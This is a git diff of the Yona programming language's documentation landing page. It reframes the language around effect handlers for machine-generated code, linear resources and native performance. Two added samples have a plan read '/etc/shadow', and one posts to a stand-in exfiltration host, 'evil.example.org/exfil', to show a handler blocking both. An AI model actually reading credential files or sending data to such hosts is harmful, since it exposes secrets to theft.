@@ -1,14 +1,15 @@
 ---
 title: Yona
-description: A statically typed functional language for the AI era — easy to generate, possible to verify, compiled to run within reach of C.
+description: A statically typed functional language for the age of autonomous software — effects answered by your handlers, resources scoped by construction, native speed via LLVM.
 template: splash
 hero:
-  title: Code that is easy to write, possible to verify, and fast to run.
+  title: The language autonomous software answers to.
   tagline: >-
-    Yona is a statically typed functional programming language compiled to
-    native executables via LLVM. Concurrency without async/await, effects
-    visible in types, resources tracked linearly — in a syntax small enough
-    to hold in your head.
+    The next programs won't all be written by humans — they will be planned,
+    generated, and executed by machines. Yona is the statically typed
+    functional language built for that world: what a program may do is a
+    fact of its type, checked before anything runs. Then it compiles to
+    native code within reach of C.
   actions:
     - text: Quick start
       link: /learn/quick-start/
@@ -16,53 +17,91 @@ hero:
       variant: primary
     - text: Why Yona 2.0
       link: /why-yona-2/
-      variant: minimal
+      variant: secondary
 ---
 
-import { Card, CardGrid } from '@astrojs/starlight/components';
-
 ```yona
-# Two file reads, one network call — all three run concurrently.
-# No async, no await, no futures in your code: independent `let`
-# bindings are parallelized by the compiler and awaited at use.
-import readFile from Std\File, get from Std\Http in
-let
-    keys   = readFile "keys.txt",
-    values = readFile "values.txt",
-    remote = get "https://example.org/manifest"
-in (zip (lines keys) (lines values), remote)
+import println from Std\IO in
+
+# This plan came from an agent. It can ask — your handler decides.
+let plan = \() -> do
+    secrets = perform Fs.read "/etc/shadow"
+    ack = perform Net.post "https://evil.example.org/exfil"
+    println secrets
+    println ack
+end in
+
+handle plan ()
+with
+    Fs.read path resume -> resume "[redacted: no filesystem]"
+    Net.post url resume -> resume "[blocked: no network]"
+    return val -> val
+end
 ```
 
-## Four reasons Yona exists
+A Yona program's side effects are *performed operations*, answered by a
+handler you control — never ambient authority over your files, sockets, or
+credentials. The plan above never touched the filesystem or the network: its
+handler answered both requests with policy. The same plan runs against real
+I/O in production and canned data in tests, without changing a line of it.
+[How effects work](/learn/effects/).
 
-<CardGrid>
-	<Card title="Built for the AI era" icon="seti:crystal">
-		A small ML-style grammar with few expression forms is easy for humans
-		*and* language models to produce correctly. Static types, exhaustive
-		pattern checks, and effect rows mean generated code is **checkable, not
-		just plausible** — the compiler is the reviewer. The docs you are
-		reading are agent-consumable too: see the [agent guide](/agents/).
-	</Card>
-	<Card title="Functional concurrency" icon="random">
-		No colored functions. Independent `let` bindings run in parallel over
-		io_uring and a work-stealing thread pool; `do` sequences; `with` scopes
-		resources. Structured concurrency and typed channels when you need
-		explicit pipelines. [Learn more](/learn/concurrency/).
-	</Card>
-	<Card title="Safety in the types" icon="approve-check">
-		Hindley–Milner inference — programs are typed without annotations.
-		Algebraic data types, traits, effect rows on function arrows, and
-		linear types for files, sockets, and channel endpoints: forgetting to
-		close a resource is a compile error. [The type
-		system](/guides/type-system/).
-	</Card>
-	<Card title="Native performance" icon="rocket">
-		Compiled ahead of time: source → LLVM IR → machine code. Stream-fused
-		collection pipelines and Perceus-style reference counting put common
-		benchmarks within 1–2× of C, and array pipelines can lower
-		transparently to the GPU. [Performance](/guides/performance/).
-	</Card>
-</CardGrid>
+## The compiler is the reviewer
+
+Machine-written code needs a reviewer that never gets tired, never skims,
+and never merges on a hunch. Hindley–Milner inference types every expression
+without annotations. Matches over algebraic data types are checked for
+exhaustiveness. And every effect a program performs is named by the compiler
+until a handler covers it:
+
+```yona
+let plan = \() -> perform Fs.read "/etc/shadow" in
+plan ()
+```
+
+```text
+error: unhandled effect operation: Fs.read
+```
+
+These docs are machine-readable too — fetch
+<a href="/llms.txt" data-astro-reload>/llms.txt</a>, or read the
+[agent guide](/agents/).
+
+## Resources that can't leak
+
+File handles, sockets, and channel endpoints are linear values, tracked so
+that each one is consumed exactly once. `with` scopes a resource to a block
+and releases it deterministically — on exception as on success:
+
+```yona
+import tcpConnect from Std\Net, send from Std\Net in
+
+with conn = tcpConnect "localhost" 8080 in
+    send conn "hello"
+# conn is closed here — no finally, no finalizer
+```
+
+[The type system](/guides/type-system/) states precisely what is checked
+today.
+
+## Runs like infrastructure
+
+No VM, no garbage collector, no async ceremony. Yona compiles ahead of time
+through LLVM and manages memory with Perceus-style reference counting;
+independent work parallelizes over io_uring and a work-stealing thread
+pool — the parallel version *is* the naive version:
+
+```yona
+import readFile from Std\File in
+
+# All three reads in flight at once — no async, no await, no Promise.all.
+let files = ["config.toml", "schema.json", "ca.pem"] in
+[| readFile f for f = files ]
+```
+
+Common benchmarks land within 1–2× of C
+([methodology](/guides/performance/)), and array pipelines lower
+transparently to Vulkan compute ([accelerators](/guides/accelerators/)).
 
 ## Install in one line
 
@@ -85,22 +124,6 @@ Windows MSI and source builds: see [Installation](/install/).
 ```bash
 yonac -e 'let fib n = if n <= 1 then n else fib (n-1) + fib (n-2) in fib 10'
 # => 55
-```
-
-## The shape of the language
-
-```yona
-# Algebraic data types with exhaustive pattern matching
-type Shape = Circle Float | Rect Float Float
-
-area shape = case shape of
-    Circle r -> 3.141592653589793 * r * r
-    Rect w h -> w * h
-end
-
-# Persistent collections and pipelines
-import foldl from Std\List in
-[area s for s = shapes, if area s > 10.0] |> foldl (\a b -> a + b) 0.0
 ```
 
 Yona is free software, licensed under the
